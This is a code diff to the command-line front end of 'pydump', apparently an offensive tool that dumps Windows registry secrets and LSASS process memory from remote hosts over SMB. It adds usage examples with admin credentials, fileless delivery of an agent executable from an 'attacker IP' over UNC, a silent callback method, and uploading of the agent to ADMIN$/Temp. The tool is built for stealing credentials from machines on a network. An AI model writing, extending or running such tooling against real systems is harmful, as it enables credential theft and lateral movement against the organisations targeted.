@@ -18,16 +18,16 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 examples:
-  # Full extraction: registry secrets + LSASS dump
-  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -d CORP
+  # Full extraction: registry secrets + LSASS dump (default)
+  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd'
 
   # Registry only (no execution on target)
-  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' --method registry
+  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m registry
 
-  # LSASS only (comsvcs method)
-  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' --method comsvcs
+  # Fileless agent delivery via UNC
+  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' --lhost 10.0.0.5
 
-  # Save LSASS dump to file
+  # Save raw dump to file for later analysis
   pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -o lsass.dmp
 
   # Parse an existing dump file
@@ -47,12 +47,12 @@ examples:
         "-m", "--method",
         choices=["auto", "registry", "comsvcs", "silent", "pipe"],
         default="auto",
-        help="Method: auto (registry+lsass), registry (no exec), comsvcs, silent, pipe (fileless agent)",
+        help="Method: auto (registry+pipe), registry (no exec), comsvcs, silent, pipe (native agent)",
     )
     dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected)")
-    dump_parser.add_argument("--lhost", default=None, help="Listen IP (silent/pipe methods)")
+    dump_parser.add_argument("--lhost", default=None, help="Attacker IP for fileless UNC delivery or silent callback")
     dump_parser.add_argument("--lport", type=int, default=0, help="Listen port (silent method)")
-    dump_parser.add_argument("--agent", default=None, help="Path to agent.exe (pipe method)")
+    dump_parser.add_argument("--agent", default=None, help="Path to agent.exe (default: agent/bin/agent.exe)")
     dump_parser.add_argument("-o", "--output", default=None, help="Save raw LSASS dump to file")
 
     # ─── parse command ──────────────────────────────────────────────────────
@@ -152,22 +152,29 @@ def _dump_lsass(session: SmbSession, args):
     method_name = args.method if args.method not in ("auto", "registry") else "pipe"
 
     if method_name == "pipe":
-        if not args.lhost:
-            print("[!] --lhost required for pipe method")
+        agent_path = args.agent or os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
+        if not os.path.isfile(agent_path):
+            print(f"[!] Agent not found: {agent_path}")
+            print("    Build it with: cd agent && make cross")
             return
-        agent_path = args.agent or "agent/bin/agent.exe"
-        method = PipeDump(session, args.lhost, agent_path)
+        fileless = bool(args.lhost)
+        method = PipeDump(session, agent_path, lhost=args.lhost)
+        if fileless:
+            print(f"[*] Method: pipe (fileless via \\\\{args.lhost})")
+        else:
+            print("[*] Method: pipe (agent uploaded to ADMIN$/Temp)")
     elif method_name == "comsvcs":
         method = ComSvcsDump(session)
+        print("[*] Method: comsvcs")
     elif method_name == "silent":
         if not args.lhost:
             print("[!] --lhost required for silent method")
             return
         method = SilentDump(session)
+        print("[*] Method: silent")
     else:
         method = ComSvcsDump(session)
-
-    print(f"[*] Method: {method_name}")
+        print(f"[*] Method: {method_name}")
 
     try:
         if method_name == "silent":
@@ -176,10 +183,9 @@ def _dump_lsass(session: SmbSession, args):
             dump_data = method.execute(lsass_pid=args.pid)
     except RuntimeError as e:
         print(f"[!] LSASS dump failed: {e}")
-        print("    (Target may have ASR rules blocking process execution)")
         return
 
-    print(f"[+] Received {len(dump_data)} bytes")
+    print(f"[+] Received {len(dump_data)} bytes ({len(dump_data) // 1024 // 1024} MB)")
 
     if args.output:
         with open(args.output, "wb") as f:
